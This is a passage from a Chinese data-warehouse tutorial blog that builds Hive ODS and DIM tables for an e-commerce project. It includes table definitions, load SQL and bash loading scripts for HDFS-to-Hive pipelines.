id="退款表（增量表）"><a href="#退款表（增量表）" class="headerlink" title="退款表（增量表）"></a>退款表（增量表）</h4><p>DROP TABLE IF EXISTS ods_refund_payment_inc;</p><p>CREATE EXTERNAL TABLE ods_refund_payment_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,out_trade_no :STRING,order_id :STRING,sku_id<br>:STRING,payment_type :STRING,trade_no :STRING,total_amount</p><p>:DECIMAL(16, 2),subject :STRING,refund_status :STRING,create_time<br>:STRING,callback_time :STRING,callback_content</p><p>:STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘退款表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_refund_payment_inc/‘;</p><h4 id="用户表（增量表）"><a href="#用户表（增量表）" class="headerlink" title="用户表（增量表）"></a>用户表（增量表）</h4><p>DROP TABLE IF EXISTS ods_user_info_inc;</p><p>CREATE EXTERNAL TABLE ods_user_info_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,login_name :STRING,nick_name :STRING,passwd<br>:STRING,name :STRING,phone_num :STRING,email</p><p>:STRING,head_img :STRING,user_level :STRING,birthday :STRING,gender<br>:STRING,create_time :STRING,operate_time</p><p>:STRING,status :STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘用户表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_user_info_inc/‘;</p><h4 id="数据装载脚本"><a href="#数据装载脚本" class="headerlink" title="数据装载脚本"></a>数据装载脚本</h4><p>（1）在hadoop102的/home/atguigu/bin目录下创建hdfs_to_ods_db.sh</p><p>[atguigu@hadoop102 bin]$ vim hdfs_to_ods_db.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d ‘-1 day’ +%F`</p><p>fi</p><p>load_data(){</p><p>sql=””</p><p>for i in $*; do</p><p>##判断路径是否存在</p><p>hadoop fs -test -e /origin_data/$APP/db/${i:4}/$do_date</p><p>##路径存在方可装载数据</p><p>if [[ $? = 0 ]]; then</p><p>sql=$sql”load data inpath ‘/origin_data/$APP/db/${i:4}/$do_date’ OVERWRITE<br>into table ${APP}.$i partition(dt=’$do_date’);”</p><p>fi</p><p>done</p><p>hive -e “$sql”</p><p>}</p><p>case $1 in</p><p>“ods_activity_info_full”)</p><p>load_data “ods_activity_info_full”</p><p>;;</p><p>“ods_activity_rule_full”)</p><p>load_data “ods_activity_rule_full”</p><p>;;</p><p>“ods_base_category1_full”)</p><p>load_data “ods_base_category1_full”</p><p>;;</p><p>“ods_base_category2_full”)</p><p>load_data “ods_base_category2_full”</p><p>;;</p><p>“ods_base_category3_full”)</p><p>load_data “ods_base_category3_full”</p><p>;;</p><p>“ods_base_dic_full”)</p><p>load_data “ods_base_dic_full”</p><p>;;</p><p>“ods_base_province_full”)</p><p>load_data “ods_base_province_full”</p><p>;;</p><p>“ods_base_region_full”)</p><p>load_data “ods_base_region_full”</p><p>;;</p><p>“ods_base_trademark_full”)</p><p>load_data “ods_base_trademark_full”</p><p>;;</p><p>“ods_cart_info_full”)</p><p>load_data “ods_cart_info_full”</p><p>;;</p><p>“ods_coupon_info_full”)</p><p>load_data “ods_coupon_info_full”</p><p>;;</p><p>“ods_sku_attr_value_full”)</p><p>load_data “ods_sku_attr_value_full”</p><p>;;</p><p>“ods_sku_info_full”)</p><p>load_data “ods_sku_info_full”</p><p>;;</p><p>“ods_sku_sale_attr_value_full”)</p><p>load_data “ods_sku_sale_attr_value_full”</p><p>;;</p><p>“ods_spu_info_full”)</p><p>load_data “ods_spu_info_full”</p><p>;;</p><p>“ods_cart_info_inc”)</p><p>load_data “ods_cart_info_inc”</p><p>;;</p><p>“ods_comment_info_inc”)</p><p>load_data “ods_comment_info_inc”</p><p>;;</p><p>“ods_coupon_use_inc”)</p><p>load_data “ods_coupon_use_inc”</p><p>;;</p><p>“ods_favor_info_inc”)</p><p>load_data “ods_favor_info_inc”</p><p>;;</p><p>“ods_order_detail_inc”)</p><p>load_data “ods_order_detail_inc”</p><p>;;</p><p>“ods_order_detail_activity_inc”)</p><p>load_data “ods_order_detail_activity_inc”</p><p>;;</p><p>“ods_order_detail_coupon_inc”)</p><p>load_data “ods_order_detail_coupon_inc”</p><p>;;</p><p>“ods_order_info_inc”)</p><p>load_data “ods_order_info_inc”</p><p>;;</p><p>“ods_order_refund_info_inc”)</p><p>load_data “ods_order_refund_info_inc”</p><p>;;</p><p>“ods_order_status_log_inc”)</p><p>load_data “ods_order_status_log_inc”</p><p>;;</p><p>“ods_payment_info_inc”)</p><p>load_data “ods_payment_info_inc”</p><p>;;</p><p>“ods_refund_payment_inc”)</p><p>load_data “ods_refund_payment_inc”</p><p>;;</p><p>“ods_user_info_inc”)</p><p>load_data “ods_user_info_inc”</p><p>;;</p><p>“all”)</p><p>load_data “ods_activity_info_full” “ods_activity_rule_full”<br>“ods_base_category1_full” “ods_base_category2_full” “ods_base_category3_full”<br>“ods_base_dic_full” “ods_base_province_full” “ods_base_region_full”<br>“ods_base_trademark_full” “ods_cart_info_full” “ods_coupon_info_full”<br>“ods_sku_attr_value_full” “ods_sku_info_full” “ods_sku_sale_attr_value_full”<br>“ods_spu_info_full” “ods_cart_info_inc” “ods_comment_info_inc”<br>“ods_coupon_use_inc” “ods_favor_info_inc” “ods_order_detail_inc”<br>“ods_order_detail_activity_inc” “ods_order_detail_coupon_inc”<br>“ods_order_info_inc” “ods_order_refund_info_inc” “ods_order_status_log_inc”<br>“ods_payment_info_inc” “ods_refund_payment_inc” “ods_user_info_inc”</p><p>;;</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x hdfs_to_ods_db.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ hdfs_to_ods_db.sh all 2020-06-14</p><h2 id="第8章-数仓开发之DIM层"><a href="#第8章-数仓开发之DIM层" class="headerlink" title="第8章 数仓开发之DIM层"></a>第8章 数仓开发之DIM层</h2><p>DIM层设计要点：</p><p>1）DIM层的设计依据是维度建模理论，该层存储维度模型的维度表。</p><p>2）DIM层的数据存储格式为orc列式存储+snappy压缩。</p><p>3）DIM层表名的命名规范为dim_表名_全量表或者拉链表标识（full/zip）</p><h3 id="商品维度表"><a href="#商品维度表" class="headerlink" title="商品维度表"></a>商品维度表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dim_sku_full;</p><p>CREATE EXTERNAL TABLE dim_sku_full</p><p>(</p><p>`id` STRING COMMENT ‘sku_id’,</p><p>`price` DECIMAL(16, 2) COMMENT ‘商品价格’,</p><p>`sku_name` STRING COMMENT ‘商品名称’,</p><p>`sku_desc` STRING COMMENT ‘商品描述’,</p><p>`weight` DECIMAL(16, 2) COMMENT ‘重量’,</p><p>`is_sale` BOOLEAN COMMENT ‘是否在售’,</p><p>`spu_id` STRING COMMENT ‘spu编号’,</p><p>`spu_name` STRING COMMENT ‘spu名称’,</p><p>`category3_id` STRING COMMENT ‘三级分类id’,</p><p>`category3_name` STRING COMMENT ‘三级分类名称’,</p><p>`category2_id` STRING COMMENT ‘二级分类id’,</p><p>`category2_name` STRING COMMENT ‘二级分类名称’,</p><p>`category1_id` STRING COMMENT ‘一级分类id’,</p><p>`category1_name` STRING COMMENT ‘一级分类名称’,</p><p>`tm_id` STRING COMMENT ‘品牌id’,</p><p>`tm_name` STRING COMMENT ‘品牌名称’,</p><p>`sku_attr_values` ARRAY&lt;STRUCT&lt;attr_id :STRING,value_id :STRING,attr_name<br>:STRING,value_name:STRING&gt;&gt; COMMENT ‘平台属性’,</p><p>`sku_sale_attr_values` ARRAY&lt;STRUCT&lt;sale_attr_id :STRING,sale_attr_value_id<br>:STRING,sale_attr_name :STRING,sale_attr_value_name:STRING&gt;&gt; COMMENT<br>‘销售属性’,</p><p>`create_time` STRING COMMENT ‘创建时间’</p><p>) COMMENT ‘商品维度表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dim/dim_sku_full/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>with</p><p>sku as</p><p>(</p><p>select</p><p>id,</p><p>price,</p><p>sku_name,</p><p>sku_desc,</p><p>weight,</p><p>is_sale,</p><p>spu_id,</p><p>category3_id,</p><p>tm_id,</p><p>create_time</p><p>from ods_sku_info_full</p><p>where dt=’2020-06-14’</p><p>),</p><p>spu as</p><p>(</p><p>select</p><p>id,</p><p>spu_name</p><p>from ods_spu_info_full</p><p>where dt=’2020-06-14’</p><p>),</p><p>c3 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category2_id</p><p>from ods_base_category3_full</p><p>where dt=’2020-06-14’</p><p>),</p><p>c2 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category1_id</p><p>from ods_base_category2_full</p><p>where dt=’2020-06-14’</p><p>),</p><p>c1 as</p><p>(</p><p>select</p><p>id,</p><p>name</p><p>from ods_base_category1_full</p><p>where dt=’2020-06-14’</p><p>),</p><p>tm as</p><p>(</p><p>select</p><p>id,</p><p>tm_name</p><p>from ods_base_trademark_full</p><p>where dt=’2020-06-14’</p><p>),</p><p>attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(‘attr_id’,attr_id,’value_id’,value_id,’attr_name’,attr_name,’value_name’,value_name))<br>attrs</p><p>from ods_sku_attr_value_full</p><p>where dt=’2020-06-14’</p><p>group by sku_id</p><p>),</p><p>sale_attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(‘sale_attr_id’,sale_attr_id,’sale_attr_value_id’,sale_attr_value_id,’sale_attr_name’,sale_attr_name,’sale_attr_value_name’,sale_attr_value_name))<br>sale_attrs</p><p>from ods_sku_sale_attr_value_full</p><p>where dt=’2020-06-14’</p><p>group by sku_id</p><p>)</p><p>insert overwrite table dim_sku_full partition(dt=’2020-06-14’)</p><p>select</p><p>sku.id,</p><p>sku.price,</p><p>sku.sku_name,</p><p>sku.sku_desc,</p><p>sku.weight,</p><p>sku.is_sale,</p><p>sku.spu_id,</p><p>spu.spu_name,</p><p>sku.category3_id,</p><p>c3.name,</p><p>c3.category2_id,</p><p>c2.name,</p><p>c2.category1_id,</p><p>c1.name,</p><p>sku.tm_id,</p><p>tm.tm_name,</p><p>attr.attrs,</p><p>sale_attr.sale_attrs,</p><p>sku.create_time</p><p>from sku</p><p>left join spu on sku.spu_id=spu.id</p><p>left join c3 on sku.category3_id=c3.id</p><p>left join c2 on c3.category2_id=c2.id</p><p>left join c1 on c2.category1_id=c1.id</p><p>left join tm on sku.tm_id=tm.id</p><p>left join attr on sku.id=attr.sku_id</p><p>left join sale_attr on sku.id=sale_attr.sku_id;</p><h3 id="优惠券维度表"><a href="#优惠券维度表" class="headerlink" title="优惠券维度表"></a>优惠券维度表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dim_coupon_full;</p><p>CREATE EXTERNAL TABLE dim_coupon_full</p><p>(</p><p>`id` STRING COMMENT ‘购物券编号’,</p><p>`coupon_name` STRING COMMENT ‘购物券名称’,</p><p>`coupon_type_code` STRING COMMENT ‘购物券类型编码’,</p><p>`coupon_type_name` STRING COMMENT ‘购物券类型名称’,</p><p>`condition_amount` DECIMAL(16, 2) COMMENT ‘满额数’,</p><p>`condition_num` BIGINT COMMENT ‘满件数’,</p><p>`activity_id` STRING COMMENT ‘活动编号’,</p><p>`benefit_amount` DECIMAL(16, 2) COMMENT ‘减金额’,</p><p>`benefit_discount` DECIMAL(16, 2) COMMENT ‘折扣’,</p><p>`benefit_rule` STRING COMMENT ‘优惠规则:满元*减*元，满*件打*折’,</p><p>`create_time` STRING COMMENT ‘创建时间’,</p><p>`range_type_code` STRING COMMENT ‘优惠范围类型编码’,</p><p>`range_type_name` STRING COMMENT ‘优惠范围类型名称’,</p><p>`limit_num` BIGINT COMMENT ‘最多领取次数’,</p><p>`taken_count` BIGINT COMMENT ‘已领取次数’,</p><p>`start_time` STRING COMMENT ‘可以领取的开始日期’,</p><p>`end_time` STRING COMMENT ‘可以领取的结束日期’,</p><p>`operate_time` STRING COMMENT ‘修改时间’,</p><p>`expire_time` STRING COMMENT ‘过期时间’</p><p>) COMMENT ‘优惠券维度表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dim/dim_coupon_full/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dim_coupon_full partition(dt=’2020-06-14’)</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>coupon_dic.dic_name,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case coupon_type</p><p>when ‘3201’ then concat(‘满’,condition_amount,’元减’,benefit_amount,’元’)</p><p>when ‘3202’ then concat(‘满’,condition_num,’件打’,10*(1-benefit_discount),’折’)</p><p>when ‘3203’ then concat(‘减’,benefit_amount,’元’)</p><p>end benefit_rule,</p><p>create_time,</p><p>range_type,</p><p>range_dic.dic_name,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>create_time,</p><p>range_type,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from ods_coupon_info_full</p><p>where dt=’2020-06-14’</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code=’32’</p><p>)coupon_dic</p><p>on ci.coupon_type=coupon_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code=’33’</p><p>)range_dic</p><p>on ci.range_type=range_dic.dic_code;</p><h3 id="活动维度表"><a href="#活动维度表" class="headerlink" title="活动维度表"></a>活动维度表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dim_activity_full;</p><p>CREATE EXTERNAL TABLE dim_activity_full</p><p>(</p><p>`activity_rule_id` STRING COMMENT ‘活动规则ID’,</p><p>`activity_id` STRING COMMENT ‘活动ID’,</p><p>`activity_name` STRING COMMENT ‘活动名称’,</p><p>`activity_type_code` STRING COMMENT ‘活动类型编码’,</p><p>`activity_type_name` STRING COMMENT ‘活动类型名称’,</p><p>`activity_desc` STRING COMMENT ‘活动描述’,</p><p>`start_time` STRING COMMENT ‘开始时间’,</p><p>`end_time` STRING COMMENT ‘结束时间’,</p><p>`create_time` STRING COMMENT ‘创建时间’,</p><p>`condition_amount` DECIMAL(16, 2) COMMENT ‘满减金额’,</p><p>`condition_num` BIGINT COMMENT ‘满减件数’,</p><p>`benefit_amount` DECIMAL(16, 2) COMMENT ‘优惠金额’,</p><p>`benefit_discount` DECIMAL(16, 2) COMMENT ‘优惠折扣’,</p><p>`benefit_rule` STRING COMMENT ‘优惠规则’,</p><p>`benefit_level` STRING COMMENT ‘优惠级别’</p><p>) COMMENT ‘活动信息表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dim/dim_activity_full/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dim_activity_full partition(dt=’2020-06-14’)</p><p>select</p><p>rule.id,</p><p>info.id,</p><p>activity_name,</p><p>rule.activity_type,</p><p>dic.dic_name,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case rule.activity_type</p><p>when ‘3101’ then concat(‘满’,condition_amount,’元减’,benefit_amount,’元’)</p><p>when ‘3102’ then concat(‘满’,condition_num,’件打’,10*(1-benefit_discount),’折’)</p><p>when ‘3103’ then concat(‘打’,10*(1-benefit_discount),’折’)</p><p>end benefit_rule,</p><p>benefit_level</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>activity_id,</p><p>activity_type,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>benefit_level</p><p>from ods_activity_rule_full</p><p>where dt=’2020-06-14’</p><p>)rule</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>activity_name,</p><p>activity_type,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time</p><p>from ods_activity_info_full</p><p>where dt=’2020-06-14’</p><p>)info</p><p>on rule.activity_id=info.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code=’31’</p><p>)dic</p><p>on rule.activity_type=dic.dic_code;</p><h3 id="地区维度表"><a href="#地区维度表" class="headerlink" title="地区维度表"></a>地区维度表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dim_province_full;</p><p>CREATE EXTERNAL TABLE dim_province_full</p><p>(</p><p>`id` STRING COMMENT ‘id’,</p><p>`province_name` STRING COMMENT ‘省市名称’,</p><p>`area_code` STRING COMMENT ‘地区编码’,</p><p>`iso_code` STRING COMMENT ‘旧版ISO-3166-2编码，供可视化使用’,</p><p>`iso_3166_2` STRING COMMENT ‘新版IOS-3166-2编码，供可视化使用’,</p><p>`region_id` STRING COMMENT ‘地区id’,</p><p>`region_name` STRING COMMENT ‘地区名称’</p><p>) COMMENT ‘地区维度表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dim/dim_province_full/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dim_province_full partition(dt=’2020-06-14’)</p><p>select</p><p>province.id,</p><p>province.name,</p><p>province.area_code,</p><p>province.iso_code,</p><p>province.iso_3166_2,</p><p>region_id,</p><p>region_name</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>region_id,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from ods_base_province_full</p><p>where dt=’2020-06-14’</p><p>)province</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>region_name</p><p>from ods_base_region_full</p><p>where dt=’2020-06-14’</p><p>)region</p><p>on province.region_id=region.id;</p><h3 id="日期维度表"><a href="#日期维度表" class="headerlink" title="日期维度表"></a>日期维度表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dim_date;</p><p>CREATE EXTERNAL TABLE dim_date</p><p>(</p><p>`date_id` STRING COMMENT ‘日期ID’,</p><p>`week_id` STRING COMMENT ‘周ID,一年中的第几周’,</p><p>`week_day` STRING COMMENT ‘周几’,</p><p>`day` STRING COMMENT ‘每月的第几天’,</p><p>`month` STRING COMMENT ‘一年中的第几月’,</p><p>`quarter` STRING COMMENT ‘一年中的第几季度’,</p><p>`year` STRING COMMENT ‘年份’,</p><p>`is_workday` STRING COMMENT ‘是否是工作日’,</p><p>`holiday_id` STRING COMMENT ‘节假日’</p><p>) COMMENT ‘时间维度表’</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dim/dim_date/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>通常情况下，时间维度表的数据并不是来自于业务系统，而是手动写入，并且由于时间维度表数据的可预见性，无须每日导入，一般可一次性导入一年的数据。</p><p>（1）创建临时表</p><p>DROP TABLE IF EXISTS tmp_dim_date_info;</p><p>CREATE EXTERNAL TABLE tmp_dim_date_info (</p><p>`date_id` STRING COMMENT ‘日’,</p><p>`week_id` STRING COMMENT ‘周ID’,</p><p>`week_day` STRING COMMENT ‘周几’,</p><p>`day` STRING COMMENT ‘每月的第几天’,</p><p>`month` STRING COMMENT ‘第几月’,</p><p>`quarter` STRING COMMENT ‘第几季度’,</p><p>`year` STRING COMMENT ‘年’,</p><p>`is_workday` STRING COMMENT ‘是否是工作日’,</p><p>`holiday_id` STRING COMMENT ‘节假日’</p><p>) COMMENT ‘时间维度表’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/tmp/tmp_dim_date_info/‘;</p><p>（2）将数据文件上传到HFDS上临时表路径/warehouse/gmall/tmp/tmp_dim_date_info</p><p>（3）执行以下语句将其导入时间维度表</p><p>insert overwrite table dim_date select * from tmp_dim_date_info;</p><p>（4）检查数据是否导入成功</p><p>select * from dim_date;</p><h3 id="用户维度表"><a href="#用户维度表" class="headerlink" title="用户维度表"></a>用户维度表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dim_user_zip;</p><p>CREATE EXTERNAL TABLE dim_user_zip</p><p>(</p><p>`id` STRING COMMENT ‘用户id’,</p><p>`login_name` STRING COMMENT ‘用户名称’,</p><p>`nick_name` STRING COMMENT ‘用户昵称’,</p><p>`name` STRING COMMENT ‘用户姓名’,</p><p>`phone_num` STRING COMMENT ‘手机号码’,</p><p>`email` STRING COMMENT ‘邮箱’,</p><p>`user_level` STRING COMMENT ‘用户等级’,</p><p>`birthday` STRING COMMENT ‘生日’,</p><p>`gender` STRING COMMENT ‘性别’,</p><p>`create_time` STRING COMMENT ‘创建时间’,</p><p>`operate_time` STRING COMMENT ‘操作时间’,</p><p>`start_date` STRING COMMENT ‘开始日期’,</p><p>`end_date` STRING COMMENT ‘结束日期’</p><p>) COMMENT ‘用户表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dim/dim_user_zip/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）分区规划</strong></p><p><strong>3）数据装载</strong></p><p><strong>（1）数据装载过程</strong></p><p><strong>（2）数据流向</strong></p><p><strong>（3）首日装载</strong></p><p>insert overwrite table dim_user_zip partition (dt=’9999-12-31’)</p><p>select</p><p>data.id,</p><p>data.login_name,</p><p>data.nick_name,</p><p>md5(data.name),</p><p>md5(data.phone_num),</p><p>md5(data.email),</p><p>data.user_level,</p><p>data.birthday,</p><p>data.gender,</p><p>data.create_time,</p><p>data.operate_time,</p><p>‘2020-06-14’ start_date,</p><p>‘9999-12-31’ end_date</p><p>from ods_user_info_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’;</p><p><strong>（4）每日装载</strong></p><p><strong>装载思路</strong></p><p><strong>装载语句</strong></p><p>with</p><p>tmp as</p><p>(</p><p>select</p><p>old.id old_id,</p><p>old.login_name old_login_name,</p><p>old.nick_name old_nick_name,</p><p>old.name old_name,</p><p>old.phone_num old_phone_num,</p><p>old.email old_email,</p><p>old.user_level old_user_level,</p><p>old.birthday old_birthday,</p><p>old.gender old_gender,</p><p>old.create_time old_create_time,</p><p>old.operate_time old_operate_time,</p><p>old.start_date old_start_date,</p><p>old.end_date old_end_date,</p><p>new.id new_id,</p><p>new.login_name new_login_name,</p><p>new.nick_name new_nick_name,</p><p>new.name new_name,</p><p>new.phone_num new_phone_num,</p><p>new.email new_email,</p><p>new.user_level new_user_level,</p><p>new.birthday new_birthday,</p><p>new.gender new_gender,</p><p>new.create_time new_create_time,</p><p>new.operate_time new_operate_time,</p><p>new.start_date new_start_date,</p><p>new.end_date new_end_date</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>login_name,</p><p>nick_name,</p><p>name,</p><p>phone_num,</p><p>email,</p><p>user_level,</p><p>birthday,</p><p>gender,</p><p>create_time,</p><p>operate_time,</p><p>start_date,</p><p>end_date</p><p>from dim_user_zip</p><p>where dt=’9999-12-31’</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>id,</p><p>login_name,</p><p>nick_name,</p><p>md5(name) name,</p><p>md5(phone_num) phone_num,</p><p>md5(email) email,</p><p>user_level,</p><p>birthday,</p><p>gender,</p><p>create_time,</p><p>operate_time,</p><p>‘2020-06-15’ start_date,</p><p>‘9999-12-31’ end_date</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.login_name,</p><p>data.nick_name,</p><p>data.name,</p><p>data.phone_num,</p><p>data.email,</p><p>data.user_level,</p><p>data.birthday,</p><p>data.gender,</p><p>data.create_time,</p><p>data.operate_time,</p><p>row_number() over (partition by data.id order by ts desc) rn</p><p>from ods_user_info_inc</p><p>where dt=’2020-06-15’</p><p>)t1</p><p>where rn=1</p><p>)new</p><p>on old.id=new.id</p><p>)</p><p>insert overwrite table dim_user_zip partition(dt)</p><p>select</p><p>if(new_id is not null,new_id,old_id),</p><p>if(new_id is not null,new_login_name,old_login_name),</p><p>if(new_id is not null,new_nick_name,old_nick_name),</p><p>if(new_id is not null,new_name,old_name),</p><p>if(new_id is not null,new_phone_num,old_phone_num),</p><p>if(new_id is not null,new_email,old_email),</p><p>if(new_id is not null,new_user_level,old_user_level),</p><p>if(new_id is not null,new_birthday,old_birthday),</p><p>if(new_id is not null,new_gender,old_gender),</p><p>if(new_id is not null,new_create_time,old_create_time),</p><p>if(new_id is not null,new_operate_time,old_operate_time),</p><p>if(new_id is not null,new_start_date,old_start_date),</p><p>if(new_id is not null,new_end_date,old_end_date),</p><p>if(new_id is not null,new_end_date,old_end_date) dt</p><p>from tmp</p><p>union all</p><p>select</p><p>old_id,</p><p>old_login_name,</p><p>old_nick_name,</p><p>old_name,</p><p>old_phone_num,</p><p>old_email,</p><p>old_user_level,</p><p>old_birthday,</p><p>old_gender,</p><p>old_create_time,</p><p>old_operate_time,</p><p>old_start_date,</p><p>cast(date_add(‘2020-06-15’,-1) as string) old_end_date,</p><p>cast(date_add(‘2020-06-15’,-1) as string) dt</p><p>from tmp</p><p>where old_id is not null</p><p>and new_id is not null;</p><h3 id="数据装载脚本-1"><a href="#数据装载脚本-1" class="headerlink" title="数据装载脚本"></a>数据装载脚本</h3><h4 id="首日装载脚本"><a href="#首日装载脚本" class="headerlink" title="首日装载脚本"></a>首日装载脚本</h4><p>（1）在hadoop102的/home/atguigu/bin目录下创建ods_to_dim_init.sh</p><p>[atguigu@hadoop102 bin]$ vim ods_to_dim_init.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>echo “请传入日期参数”</p><p>exit</p><p>fi</p><p>dim_user_zip=”</p><p>insert overwrite table ${APP}.dim_user_zip partition (dt=’9999-12-31’)</p><p>select</p><p>data.id,</p><p>data.login_name,</p><p>data.nick_name,</p><p>md5(data.name),</p><p>md5(data.phone_num),</p><p>md5(data.email),</p><p>data.user_level,</p><p>data.birthday,</p><p>data.gender,</p><p>data.create_time,</p><p>data.operate_time,</p><p>‘$do_date’ start_date,</p><p>‘9999-12-31’ end_date</p><p>from ${APP}.ods_user_info_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’;</p><p>“</p><p>dim_sku_full=”</p><p>with</p><p>sku as</p><p>(</p><p>select</p><p>id,</p><p>price,</p><p>sku_name,</p><p>sku_desc,</p><p>weight,</p><p>is_sale,</p><p>spu_id,</p><p>category3_id,</p><p>tm_id,</p><p>create_time</p><p>from ${APP}.ods_sku_info_full</p><p>where dt=’$do_date’</p><p>),</p><p>spu as</p><p>(</p><p>select</p><p>id,</p><p>spu_name</p><p>from ${APP}.ods_spu_info_full</p><p>where dt=’$do_date’</p><p>),</p><p>c3 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category2_id</p><p>from ${APP}.ods_base_category3_full</p><p>where dt=’$do_date’</p><p>),</p><p>c2 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category1_id</p><p>from ${APP}.ods_base_category2_full</p><p>where dt=’$do_date’</p><p>),</p><p>c1 as</p><p>(</p><p>select</p><p>id,</p><p>name</p><p>from ${APP}.ods_base_category1_full</p><p>where dt=’$do_date’</p><p>),</p><p>tm as</p><p>(</p><p>select</p><p>id,</p><p>tm_name</p><p>from ${APP}.ods_base_trademark_full</p><p>where dt=’$do_date’</p><p>),</p><p>attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(‘attr_id’,attr_id,’value_id’,value_id,’attr_name’,attr_name,’value_name’,value_name))<br>attrs</p><p>from ${APP}.ods_sku_attr_value_full</p><p>where dt=’$do_date’</p><p>group by sku_id</p><p>),</p><p>sale_attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(‘sale_attr_id’,sale_attr_id,’sale_attr_value_id’,sale_attr_value_id,’sale_attr_name’,sale_attr_name,’sale_attr_value_name’,sale_attr_value_name))<br>sale_attrs</p><p>from ${APP}.ods_sku_sale_attr_value_full</p><p>where 